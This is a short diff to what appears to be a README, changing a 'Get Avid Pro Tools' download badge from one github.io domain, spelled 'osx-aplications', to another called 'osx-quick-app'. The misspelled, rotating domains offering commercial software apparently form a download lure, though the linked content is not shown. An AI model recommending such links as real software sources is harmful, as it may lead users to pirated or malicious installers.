@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/protools">
+  <a href="https://osx-quick-app.github.io/.github/protools">
     <img src="https://img.shields.io/badge/Get%20Avid%20Pro%20Tools-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Avid Pro Tools">
   </a>
 </p>
